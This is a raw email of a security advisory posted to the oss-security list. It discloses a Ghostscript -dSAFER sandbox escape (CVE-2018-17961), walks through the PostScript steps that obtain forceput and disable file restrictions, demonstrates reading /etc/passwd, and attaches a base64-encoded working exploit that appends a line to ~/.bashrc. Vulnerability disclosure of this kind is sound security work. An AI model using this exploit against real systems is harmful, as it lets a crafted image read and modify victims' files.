X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["14858" "Tuesday" "9" "October" "2018" "06:58:39" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFk+nnBgWaDNKgvLnVjp4rz3SttBQvjCCXjiqC71rV6bBrA@mail.gmail.com>" "263" "[oss-security] ghostscript: bypassing executeonly to escape -dSAFER sandbox (CVE-2018-17961)" "^Date:" nil nil "10" "2018100913:58:39" "[oss-security] ghostscript: bypassing executeonly to escape -dSAFER sandbox (CVE-2018-17961)" (number mark "        taviso@googl Oct  9  263/14858 " thread-indent "\"[oss-security] ghostscript: bypassing executeonly to escape -dSAFER sandbox (CVE-2018-17961)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 32370 invoked by uid 550); 9 Oct 2018 13:58:58 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 32348 invoked from network); 9 Oct 2018 13:58:57 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=4BoKORAWH7KzYbVn6/Nojtf91n0+xtzK5JMwZxQ/PAI=;
        b=COSLLDpfIxK4g/YBn0tRCA5pdINKAK1gqdfSklHxvakXjk8mPxs4mtSmzlgRfDVWZ1
         Fweqoo/ulCzVh1eHt913Rj6sk3FOFMVmccjHAf/LRAMTjr3HgcDzyy1lZB09mlEi3QLa
         PrwcACaI/LBz3ouc3QtGebRejc7R1Nc2cvZhPHqcjNFl050bl6G5rWSIiVYzfJpNkjCo
         NVSJEdjMvEmQkTW6WFXMfjqjh8SSV0jzZLk56f+lA0OPNoKFu/kY/QkE5/aylzHDLUb+
         ihVeUewd1VVo6OQp/Axa0/ol4xWzVbjz7Us56cqoHQJYmUIEI9mifojLQBRD9hCMICzm
         ciKg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=4BoKORAWH7KzYbVn6/Nojtf91n0+xtzK5JMwZxQ/PAI=;
        b=j2cooaUDBhntVext+c/MjyiAeU0U2OVvWkkRtYttzxb9scZJI4eN+22z0IojHr9GIo
         wLbwRZPbUqYC6ZpKCXnoB0CWD9IKtd7OgcsX+r/Qt/wHELp3egIt/hwcwOBmCsjal/W0
         jCLNQLk6yNGvp7UhUTUdmmLxYJ7kIolhGljmALsgHZchGkoZAEJRD3iEt7LubpMkZ433
         uZOaNjOdx61UZYqttDBRFJdHeL9E32tp00ocfDkDLdHXqzXzTq7ahCp2zR6bp1SXNcN1
         K8C8Z+Oe8iKhJX6xsvH0Jg4DxsRYamSvEARY726ZO9l5lulPHW7svkAmpoP4nkzk/4m5
         46PQ==
X-Gm-Message-State: ABuFfohFk3mfO7imMxBLLJJjqF26+jiCblhIJV3lctl8fwgkGsXsusqs
	S5bsKWOst7Ep7NAz4O3ix7VxB0y7e6MdOXacK1rW5k8n
X-Google-Smtp-Source: ACcGV60nYZUf4rmwmhmk8e+ZdXhlKAn5rpH9p+OQnhfsaf48/wWItrFudLSvIHg75FrO2eMj/u9rcVm6wZzRyZfHx7E=
X-Received: by 2002:ac8:5257:: with SMTP id y23-v6mr23393907qtn.78.1539093524736;
 Tue, 09 Oct 2018 06:58:44 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CAJ_zFk+nnBgWaDNKgvLnVjp4rz3SttBQvjCCXjiqC71rV6bBrA@mail.gmail.com>
Content-Type: multipart/mixed; boundary="000000000000d20bcd0577cc2208"
Date: Tue, 9 Oct 2018 06:58:39 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] ghostscript: bypassing executeonly to escape -dSAFER sandbox (CVE-2018-17961)
To: oss-security@lists.openwall.com

--000000000000d20bcd0577cc2208
Content-Type: multipart/alternative; boundary="000000000000d20bcb0577cc2206"

--000000000000d20bcb0577cc2206
Content-Type: text/plain; charset="UTF-8"

Hello, this <https://bugs.chromium.org/p/project-zero/issues/detail?id=1682> is
another ghostscript -dSAFER sandbox escape that worked in HEAD up until
recently, and probably all ghostscript versions still in use (I didn't
check exactly how far back, but a long time).

Full working exploit that works in the last few versions is attached,
viewing it in evince, imagemagick, gimp, okular, etc should add a line to
~/.bashrc. Because nautilus will automatically invoke evince-thumbnailer
without any user-interaction, just browsing a website is enough to trigger
the vulnerability in some common configurations.

taviso@ubuntu:~$ convert exploit.jpg output.jpg
taviso@ubuntu:~$ tail -1 ~/.bashrc
echo pwned by postscript

Good news: If your distro ships gnome-desktop 3.25.90 or later and wasn't
bananas enough to disable sandboxing (yes, some are really doing that), I
don't know of any way to trigger automatic exploitation. If you open the
file manually, you're still in trouble though.

BACKGROUND

One of the core access control features in postscript is the ability to
mark procedures executeonly, this prevents users from peeking inside system
routines and getting references to powerful operators they shouldn't have
access to. I have a full description of how this mechanism works, but
release of that description is blocking on some other embargoed issues. It
should be available here
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1675>
eventually (please
forgive this minor violation of list rules).

Until recently you could install an error handler in errordict
<https://atrey.karlin.mff.cuni.cz/~milanek/PostScript/Reference/PSL2e.html#errordict>
and if you cause an executeonly procedure to stop ("stop" is the postscript
term for "throw an exception"), that would expose the faulting operator to
the error handler. That is no longer possible, because errordict is now
ignored in the -dSAFER sandbox (that was CVE-2018-17183
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17183>).

DETAILS

Unfortunately, the fix was incomplete, because you could still make the
invocation of the errorhandler itself fail, or access the saved
errorhandler internal state.

One way to exploit this is to find an executeonly procedure that can stop,
trigger an exception and then make calling the errorhandler stop
(/stackoverflow or /execoverflow will do). When that fails the operand
stack is left in an inconsistent state, because ghostscript was trying to
set up the errorhandler but failed.

Here is how to exploit it:

% first, fill up the stack with junk so there is only a tiny bit of room
for the errorhandler
GS>0 1 300368 {} for

% We can make /switch_to_normal_marking_ops fail by making pdfopdict a
non-dictionary
GS<300369>/pdfopdict null def

% call /switch_to_normal_marking_ops (which is executeonly)
GS<300369>GS_PDF_ProcSet /switch_to_normal_marking_ops get stopped

% that failed because of /typecheck writing to pdfopdict
GS<2>==
true

% And if we look at the last few elements of the saved stack...
GS<1>dup dup length 10 sub 10 getinterval ==
[300364 300365 300366 300367 300368 null /m {normal_m} --.forceput--
/typecheck]

% The failed operator is on there ready to be passed to the errorhandler.

forceput is a very powerful operator that ignores all access controls, we
can extract it from the stack, and then do whatever we like.

% Lets disable SAFER and give ourselves access to the whole filesystem
(including .bashrc, ssh keys, chrome cookies, everything)
systemdict /SAFER false forceput
systemdict /userparams get /PermitFileControl [(*)] forceput
systemdict /userparams get /PermitFileWriting [(*)] forceput
systemdict /userparams get /PermitFileReading [(*)] forceput

Putting it all together, here is reading /etc/passwd just to demo:

$ gs -dSAFER -f test.ps
GPL Ghostscript GIT PRERELEASE 9.26 (2018-09-13)
Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
This software comes with NO WARRANTY: see the file PUBLIC for details.
(root:x:0:0:root:/root:/bin/bash)

The fix is public now, here are the necessary commit:

http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a54c9e61e7d0
http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a6807394bd94

p.s. plz can we deprecate untrusted postscript :(

--000000000000d20bcb0577cc2206
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div di=
r=3D"ltr"><div dir=3D"ltr">Hello, <a href=3D"https://bugs.chromium.org/p/pr=
oject-zero/issues/detail?id=3D1682" target=3D"_blank">this</a>=C2=A0is anot=
her ghostscript -dSAFER sandbox escape that worked in HEAD up until recentl=
y, and probably all ghostscript versions still in use (I didn&#39;t check e=
xactly how far back, but a long time).<div><br></div><div>Full working expl=
oit that works in the last few versions is attached, viewing it in evince, =
imagemagick, gimp, okular, etc should add a line to ~/.bashrc. Because naut=
ilus will automatically invoke evince-thumbnailer without any user-interact=
ion, just browsing a website is enough to trigger the vulnerability in some=
 common configurations.</div><div><br></div><div><div><div><font face=3D"mo=
nospace, monospace">taviso@ubuntu:~$ convert exploit.jpg output.jpg</font><=
/div><div><span style=3D"font-family:monospace,monospace">taviso@ubuntu:~$ =
tail -1 ~/.bashrc</span><br></div><div><font face=3D"monospace, monospace">=
echo pwned by postscript</font></div></div><div><br></div></div><div><div>G=
ood news: If your distro ships gnome-desktop 3.25.90 or later and wasn&#39;=
t bananas enough to disable sandboxing (yes, some are really doing that), I=
 don&#39;t know of any way to trigger automatic exploitation. If you open t=
he file manually, you&#39;re still in trouble though.</div></div><div><br><=
/div><div>BACKGROUND</div><div><br></div><div>One of the core access contro=
l features in postscript is the ability to mark procedures executeonly, thi=
s prevents users from peeking inside system routines and getting references=
 to powerful operators they shouldn&#39;t have access to. I have a full des=
cription of how this mechanism works, but release of that description is bl=
ocking on some other embargoed issues. It should be available <a href=3D"ht=
tps://bugs.chromium.org/p/project-zero/issues/detail?id=3D1675" target=3D"_=
blank">here</a>=C2=A0eventually=C2=A0(please forgive this minor violation o=
f list rules).</div><div><br></div><div>Until recently you could install an=
 error handler in <a href=3D"https://atrey.karlin.mff.cuni.cz/~milanek/Post=
Script/Reference/PSL2e.html#errordict" target=3D"_blank">errordict</a> and =
if you cause an executeonly procedure to stop (&quot;stop&quot; is the post=
script term for &quot;throw an exception&quot;), that would expose the faul=
ting operator to the error handler. That is no longer possible, because err=
ordict is now=C2=A0 ignored in the -dSAFER sandbox (that was=C2=A0<a href=
=3D"https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2018-17183" rel=3D=
"noreferrer" target=3D"_blank">CVE-2018-17183</a>).</div><div><br></div><di=
v>DETAILS</div><div><br></div><div>Unfortunately, the fix was incomplete, b=
ecause you could still make the invocation of the errorhandler itself fail,=
 or access the saved errorhandler internal state.</div><div><div><br></div>=
<div>One way to exploit this is to find an executeonly procedure that can s=
top, trigger an exception and then make calling the errorhandler stop (/sta=
ckoverflow or /execoverflow will do). When that fails the operand stack is =
left in an inconsistent state, because ghostscript was trying to set up the=
 errorhandler but failed.=C2=A0</div><div><br></div><div>Here is how to exp=
loit it:</div><div><br></div><div><font face=3D"monospace, monospace">% fir=
st, fill up the stack with junk so there is only a tiny bit of room for the=
 errorhandler</font></div><div><font face=3D"monospace, monospace">GS&gt;0 =
1 300368 {} for</font></div><div><font face=3D"monospace, monospace"><br></=
font></div><div><font face=3D"monospace, monospace">% We can make /switch_t=
o_normal_marking_ops fail by making pdfopdict a non-dictionary</font></div>=
<div><font face=3D"monospace, monospace">GS&lt;300369&gt;/pdfopdict null de=
f</font></div><div><br></div><div><font face=3D"monospace, monospace">% cal=
l /switch_to_normal_marking_ops (which is executeonly)</font></div><div><fo=
nt face=3D"monospace, monospace">GS&lt;300369&gt;GS_PDF_ProcSet /switch_to_=
normal_marking_ops get stopped</font></div><div><br></div><div><font face=
=3D"monospace, monospace">% that failed because of /typecheck writing to pd=
fopdict</font></div><div><font face=3D"monospace, monospace">GS&lt;2&gt;=3D=
=3D</font></div><div><font face=3D"monospace, monospace">true</font></div><=
div><br></div><div><font face=3D"monospace, monospace">% And if we look at =
the last few elements of the saved stack...</font></div><div><font face=3D"=
monospace, monospace">GS&lt;1&gt;dup dup length 10 sub 10 getinterval =3D=
=3D</font></div><div><font face=3D"monospace, monospace">[300364 300365 300=
366 300367 300368 null /m {normal_m} --.forceput-- /typecheck]</font></div>=
<div><br></div><div><font face=3D"monospace, monospace">% The failed operat=
or is on there ready to be passed to the errorhandler.</font></div><div><br=
></div><div>forceput is a very powerful operator that ignores all access co=
ntrols, we can extract it from the stack, and then do whatever we like.</di=
v><div><br></div><div><font face=3D"monospace, monospace">% Lets disable SA=
FER and give ourselves access to the whole filesystem (including .bashrc, s=
sh keys, chrome cookies, everything)</font></div><div><font face=3D"monospa=
ce, monospace">systemdict /SAFER false forceput</font></div><div><font face=
=3D"monospace, monospace">systemdict /userparams get /PermitFileControl [(*=
)] forceput</font></div><div><font face=3D"monospace, monospace">systemdict=
 /userparams get /PermitFileWriting [(*)] forceput</font></div><div><font f=
ace=3D"monospace, monospace">systemdict /userparams get /PermitFileReading =
[(*)] forceput</font></div><div><br></div><div>Putting it all together, her=
e is reading /etc/passwd just to demo:</div><div><br></div><div><font face=
=3D"monospace, monospace">$ gs -dSAFER -f <a href=3D"http://test.ps" target=
=3D"_blank">test.ps</a>=C2=A0</font></div><div><font face=3D"monospace, mon=
ospace">GPL Ghostscript GIT PRERELEASE 9.26 (2018-09-13)</font></div><div><=
font face=3D"monospace, monospace">Copyright (C) 2018 Artifex Software, Inc=
.=C2=A0 All rights reserved.</font></div><div><font face=3D"monospace, mono=
space">This software comes with NO WARRANTY: see the file PUBLIC for detail=
s.</font></div><div><font face=3D"monospace, monospace">(root:x:0:0:root:/r=
oot:/bin/bash)</font></div><div><br></div></div><div>The fix is public now,=
 here are the necessary commit:</div><div><br></div><div><a href=3D"http://=
git.ghostscript.com/?p=3Dghostpdl.git;a=3Dcommitdiff;h=3Da54c9e61e7d0" targ=
et=3D"_blank">http://git.ghostscript.com/?p=3Dghostpdl.git;a=3Dcommitdiff;h=
=3Da54c9e61e7d0</a></div><div><a href=3D"http://git.ghostscript.com/?p=3Dgh=
ostpdl.git;a=3Dcommitdiff;h=3Da6807394bd94" target=3D"_blank">http://git.gh=
ostscript.com/?p=3Dghostpdl.git;a=3Dcommitdiff;h=3Da6807394bd94</a><br></di=
v><div><br></div><div>p.s. plz can we deprecate untrusted postscript :(<br>=
</div></div></div></div></div></div></div>

--000000000000d20bcb0577cc2206--

--000000000000d20bcd0577cc2208
Content-Type: application/postscript; name="executeonly-bypass.ps"
Content-Disposition: attachment; filename="executeonly-bypass.ps"
Content-Transfer-Encoding: base64
Content-ID: <f_jms0u53t0>
X-Attachment-Id: f_jms0u53t0

JSFQUwolCiUgVGhpcyBpcyBnaG9zdHNjcmlwdCBidWcgNjk5ODE2LCBieXBh
c3NpbmcgZXhlY3V0ZW9ubHkgcmVzdHJpY3Rpb25zCiUgdmlhIGVycm9yIGhh
bmRsZXIuCiUKJSBQcm9qZWN0IFplcm8gYnVnIDE2ODIuCiUKCiUgOy0pCih3
aGF0IGRvIHdlIHdhbnQ/XG4pIHByaW50CihcdGRlcHJlY2F0ZSB1bnRydXN0
ZWQgcG9zdHNjcmlwdCFcbikgcHJpbnQKKHdoZW4gZG8gd2Ugd2FudCBpdD9c
bikgcHJpbnQKKFx0bm93IVxuKSBwcmludAoKJSBUaGlzIHdpbGwgbWFrZSBz
d2l0Y2hfdG9fbm9ybWFsX21hcmtpbmdfb3BzIC90eXBlY2hlY2sKL3BkZm9w
ZGljdCBudWxsIGRlZgoKJSBjYWxsIHN3aXRjaF90b19ub3JtYWxfbWFya2lu
Z19vcHMKR1NfUERGX1Byb2NTZXQgL3N3aXRjaF90b19ub3JtYWxfbWFya2lu
Z19vcHMgZ2V0IHN0b3BwZWQgcG9wCgolIG5vdyB3ZSBoYXZlIGFjY2VzcyB0
byBmb3JjZXB1dAovZm9yY2VwdXQgJGVycm9yIC9jb21tYW5kIGdldCBkZWYK
CiUgTm93IHdlIGNhbiBkbyB3aGF0ZXZlciB3ZSBsaWtlLCBsZXRzIGRpc2Fi
bGUgU0FGRVIgYW5kIGdpdmUgb3Vyc2VsdmVzIGFjY2VzcwolIHRvIHRoZSB3
aG9sZSBmaWxlc3lzdGVtIChpbmNsdWRpbmcgLmJhc2hyYywgc3NoIGtleXMs
IGNocm9tZSBjb29raWVzLCBldmVyeXRoaW5nKQpzeXN0ZW1kaWN0IC9TQUZF
UiBmYWxzZSBmb3JjZXB1dApzeXN0ZW1kaWN0IC91c2VycGFyYW1zIGdldCAv
UGVybWl0RmlsZUNvbnRyb2wgWygqKV0gZm9yY2VwdXQKc3lzdGVtZGljdCAv
dXNlcnBhcmFtcyBnZXQgL1Blcm1pdEZpbGVXcml0aW5nIFsoKildIGZvcmNl
cHV0CnN5c3RlbWRpY3QgL3VzZXJwYXJhbXMgZ2V0IC9QZXJtaXRGaWxlUmVh
ZGluZyBbKCopXSBmb3JjZXB1dAoKJSBEZW1vbnN0cmF0ZSByZWFkaW5nIGEg
ZmlsZSB3ZSBzaG91bGRudCBoYXZlIGFjY2VzcyB0by4KKC9ldGMvcGFzc3dk
KSAocikgZmlsZSBkdXAgNjQgc3RyaW5nIHJlYWRsaW5lIHBvcCA9PSBjbG9z
ZWZpbGUKCiUgVGhlIGdldGVudiBvcGVyYXRvciBnZXRzIHJlbW92ZWQgYW5k
IHdlIGNhbid0IGdldCBpdCBiYWNrLCBoZXJlIGlzIGEKJSByZXBsYWNlbWVu
dC4KJSAoSE9NRSkgbmV3Z2V0ZW52ICgvcGF0aC90by9ob21lKSB0cnVlICAg
ICAlIGZvdW5kCiUgKGZvb2JhcikgbmV3Z2V0ZW52IGZhbHNlICAgICAgICAg
ICAgICAgICAgJSBub3Rmb3VuZAovbmV3Z2V0ZW52IHsKICAgICUgcmVhZCBl
bnRpcmUgZW52aXJvbm1lbnQgaW50byBzdHJpbmcKICAgICgvcHJvYy9zZWxm
L2Vudmlyb24pIChyKSBmaWxlIGR1cCAzMjc2OCBzdHJpbmcgcmVhZHN0cmlu
ZyBwb3AgZXhjaCBjbG9zZWZpbGUKCiAgICAlIHNlYXJjaCBmb3IgdmFyaWFi
bGUKICAgIGV4Y2ggZHVwIChcMCkgZXhjaCBjb25jYXRzdHJpbmdzICg9KSBj
b25jYXRzdHJpbmdzIGV4Y2ggMyAxIHJvbGwgc2VhcmNoIG5vdCB7CiAgICAg
ICAgJSBub3QgZm91bmQsIGNvdWxkIGJlIGF0IHRoZSBzdGFydCwgc28gbm8g
bGVhZGluZyBudWw/CiAgICAgICAgMSBpbmRleCAoPSkgY29uY2F0c3RyaW5n
cyBhbmNob3JzZWFyY2ggbm90IHsKICAgICAgICAgICAgKG5vdGZvdW5kKQog
ICAgICAgIH0geyBwb3AgfSBpZmVsc2UKICAgIH0geyBwb3AgcG9wIH0gaWZl
bHNlCgogICAgJSByZW1vdmUgZXZlcnl0aGluZyBhZnRlciBwYXRoLCB0aGVy
ZSBpcyBhbHdheXMgYSBudWwgb24gTGludXguCiAgICAoXDApIHNlYXJjaCB7
IDQgMSByb2xsIHBvcCBwb3AgcG9wIHRydWUgfSB7CiAgICAgICAgJSBtdXN0
IGJlIHRoZSBub3Rmb3VuZCBzdHJpbmcKICAgICAgICBwb3AgcG9wIHBvcCBm
YWxzZQogICAgfSBpZmVsc2UKfSBkZWYKCiUgSGVyZSBpcyBob3cgdG8gZWRp
dCAuYmFzaHJjLi4uCi9iYWNrZG9vcmJhc2ggewogICAgJSBub3cgd2UgY2Fu
IGFwcGVuZCB0byBiYXNocmMKICAgIChIT01FKSBuZXdnZXRlbnYgcG9wICgv
LmJhc2hyYykgY29uY2F0c3RyaW5ncyAoYSkgZmlsZSBkdXAKCiAgICAlIGJh
Y2tkb29yCiAgICAoZWNobyBwd25lZCBieSBwb3N0c2NyaXB0XG4pIHdyaXRl
c3RyaW5nCgogICAgJSBhbGwgZG9uZQogICAgY2xvc2VmaWxlCn0gZGVmCgpi
YWNrZG9vcmJhc2gKcXVpdAo=

--000000000000d20bcd0577cc2208--
